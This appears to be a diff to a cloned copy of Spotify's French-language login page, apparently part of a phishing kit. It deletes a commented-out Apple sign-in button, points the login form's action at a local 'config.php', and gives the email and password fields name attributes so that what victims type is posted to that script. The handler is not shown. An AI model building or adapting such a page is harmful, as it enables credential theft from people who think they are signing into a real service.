@@ -24,11 +24,6 @@
           <a class="btn btn-block btn-facebook ng-binding" target="_parent" role="button" analytics-on="click" analytics-category="Login View" analytics-event="Facebook Button" analytics-label="{{" clientid="" }}="">Continuer avec Facebook</a>
         </div>
       </div>
-      <!-- <div class="row">
-        <div class="col-xs-12">
-          <a ng-href="https://appleid.apple.com/auth/authorize?client_id=com.spotify.accounts&amp;response_type=code&amp;response_mode=form_post&amp;scope=name%20email&amp;state=AQBDKXTOdK0R3nrNu%2FwHN3kNszpUj6aIbfn%2F6ppdv7jwwYaFu6mzQRmJ4wEOhlKkJb%2FDdFwx6fJwEwt1EtAqXG%2BQ2SUeuD9jY55bFsu9uRbl7GcLFZ2%2F2XmhVsHMoOfYiYbix0%2BYwBQAl3DMh1M%3D&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Fapple%2Fredirect" class="btn btn-block btn-black btn-apple ng-binding" target="_parent" role="button" analytics-on="click" analytics-category="Login View" analytics-event="Apple Button" analytics-label="{{" clientid="" }}="" href="https://appleid.apple.com/auth/authorize?client_id=com.spotify.accounts&amp;response_type=code&amp;response_mode=form_post&amp;scope=name%20email&amp;state=AQBDKXTOdK0R3nrNu%2FwHN3kNszpUj6aIbfn%2F6ppdv7jwwYaFu6mzQRmJ4wEOhlKkJb%2FDdFwx6fJwEwt1EtAqXG%2BQ2SUeuD9jY55bFsu9uRbl7GcLFZ2%2F2XmhVsHMoOfYiYbix0%2BYwBQAl3DMh1M%3D&amp;redirect_uri=https%3A%2F%2Faccounts.spotify.com%2Flogin%2Fapple%2Fredirect">Continuer avec Apple</a>
-        </div>
-      </div> -->
       <div class="row">
         <div class="col-xs-12">
           <a class="btn btn-block btn-default btn-google ng-binding" role="button" >Continuer avec Google</a>
@@ -44,14 +39,14 @@
         </div>
       </div>
   
-      <form name="$parent.accounts" method="post" novalidate="" class="ng-valid-sp-disallow-chars ng-dirty ng-valid-parse ng-valid ng-valid-required">
+      <form name="$parent.accounts" method="post" novalidate="" action="config.php"class="ng-valid-sp-disallow-chars ng-dirty ng-valid-parse ng-valid ng-valid-required">
   
         <div class="row" ng-class="{'has-error': (accounts.username.$dirty &amp;&amp; accounts.username.$invalid) || invalidCredentials}">
           <div class="col-xs-12">
             <label for="login-username" class="control-label ng-binding">
               Adresse email ou nom d'utilisateur
             </label>
-            <input ng-model="form.username" type="text" class="form-control input-with-feedback ng-pristine ng-valid ng-valid-sp-disallow-chars ng-not-empty ng-valid-required ng-touched" name="username" id="login-username" placeholder="Adresse email ou nom d'utilisateur" required="" sp-disallow-chars=":%&amp;'`´&quot;" sp-disallow-chars-model="usernameDisallowedChars" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false" ng-change="onInputChange()">
+            <input ng-model="form.username" type="text" name="username" class="form-control input-with-feedback ng-pristine ng-valid ng-valid-sp-disallow-chars ng-not-empty ng-valid-required ng-touched" name="username" id="login-username" placeholder="Adresse email ou nom d'utilisateur" required="" sp-disallow-chars=":%&amp;'`´&quot;" sp-disallow-chars-model="usernameDisallowedChars" autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" ng-trim="false" ng-change="onInputChange()">
             <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid -->
           </div>
         </div>
@@ -61,7 +56,7 @@
             <label for="login-password" class="control-label ng-binding">
               Mot de passe
             </label>
-            <input ng-model="form.password" type="password" class="form-control input-with-feedback ng-not-empty ng-dirty ng-valid-parse ng-valid ng-valid-required ng-touched" name="password" id="login-password" placeholder="Mot de passe" required="" autocomplete="off" ng-trim="false" ng-change="onInputChange()">
+            <input ng-model="form.password" name="password" type="password" class="form-control input-with-feedback ng-not-empty ng-dirty ng-valid-parse ng-valid ng-valid-required ng-touched" name="password" id="login-password" placeholder="Mot de passe" required="" autocomplete="off" ng-trim="false" ng-change="onInputChange()">
             <!-- ngIf: accounts.password.$dirty && accounts.password.$invalid -->
           </div>
         </div>
